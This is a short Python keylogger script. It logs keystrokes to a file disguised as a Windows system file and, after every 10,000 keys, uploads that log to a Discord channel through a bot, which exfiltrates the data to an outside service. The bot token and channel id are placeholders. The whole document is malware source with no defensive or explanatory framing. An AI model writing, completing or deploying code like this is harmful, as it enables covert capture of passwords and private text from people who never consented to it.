import discord
import asyncio
import msvcrt

TOKEN = 'NUH-UH'
logfile = 'c:/WINDOWS32.xyz'
channel_id = 69420
intents = discord.Intents.default()
client = discord.Client(intents=intents)

keypress_count = 0


async def send_file():
    channel = client.get_channel(channel_id)
    if channel:
        with open(logfile, 'rb') as file:
            await channel.send(file=discord.File(file))
        print("File sent successfully.")
    else:
        print("Channel not found.")


@client.event
async def on_ready():
    print('We have logged in')
    await detect_key_press()


async def detect_key_press():
    global keypress_count
    while True:
        if msvcrt.kbhit():
            key = msvcrt.getch().decode('utf-8')
            with open(logfile, 'a') as f:
                f.write('{}\n'.format(key))
            print(key)
            keypress_count += 1
            if keypress_count == 10000:
                await send_file()
                keypress_count = 0
        await asyncio.sleep(0.1)

client.run(TOKEN)
